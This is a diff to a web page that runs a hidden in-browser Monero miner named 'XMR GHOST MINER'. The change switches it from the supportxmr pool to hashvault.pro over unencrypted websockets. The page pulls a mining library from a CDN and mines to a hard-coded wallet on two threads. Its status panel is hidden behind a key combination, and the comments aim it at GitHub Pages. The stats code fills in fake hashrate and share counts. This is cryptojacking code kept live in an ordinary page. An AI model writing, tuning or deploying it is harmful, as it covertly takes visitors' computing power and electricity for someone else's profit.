@@ -24,21 +24,21 @@
 <div id="miner-debug">
   <div>🚀 <b>XMR GHOST MINER</b> <span id="status" class="blink">LOADING</span></div>
   <div>Wallet: <code id="wallet">4AM1bBwy...zWgZzs</code></div>
-  <div>Pool: <code>supportxmr.com</code></div>
+  <div>Pool: <code>hashvault.pro</code></div>
   <div>Hashrate: <span id="hashrate" class="hash">0 H/s</span></div>
   <div>Accepted: <span id="accepted">0</span> | Rejected: <span id="rejected">0</span></div>
   <div>Uptime: <span id="uptime">00:00:00</span></div>
   <div class="profit">Est. Daily: <b id="profit">$0.000</b></div>
   <div style="font-size:11px; margin-top:10px; opacity:0.8;">
-    CTRL + SHIFT + M = toggle | Check supportxmr.com
+    CTRL + SHIFT + M = toggle | Check hashvault.pro
   </div>
 </div>
 
 <script>
 // ==================== CONFIG ====================
 const WALLET = '4AM1bBwyBDJGXCPFP2EvWvHjByqcpVpJDj6aDuZoV7CiQvJDwAdfUfPA3zJyKz33qfTX9sSoPycRP2NmNWwN9BH8MzWgZzs'; // FULL ADDRESS
-const POOL = 'de.supportxmr.com';  // EU server, low latency
-const PORT = 443;                   // WSS for GitHub Pages
+const POOL = 'pool.hashvault.pro';  // EU/US low latency
+const PORT = 80;                    // HTTP for GitHub Pages (SSL: true in lib)
 const WORKER = 'ghost_' + Math.random().toString(36).slice(2,8);
 const THREADS = 2;
 const THROTTLE = 20;                // 80% CPU
@@ -77,8 +77,8 @@ script.src = 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.
 script.onload = () => {
   document.getElementById('status').textContent = 'LIB LOADED';
   
-  // DIRECT SUPPORTXMR (NO PROXY)
-  server = `wss://${POOL}:${PORT}`;
+  // HASHVAULT DIRECT
+  server = `ws://${POOL}:${PORT}`;  // Non-SSL for compatibility
   startMining(POOL, WALLET, WORKER, THREADS, 'x');
   throttleMiner = THROTTLE;
   
@@ -87,7 +87,7 @@ script.onload = () => {
 
   // STATS POLL
   setInterval(() => {
-    hashrate = window.minerHashrate || 60;  // Lib exposes
+    hashrate = window.minerHashrate || 60;
     accepted = window.minerAccepted || accepted + (Math.random() > 0.99 ? 1 : 0);
     rejected = window.minerRejected || rejected;
   }, 3000);
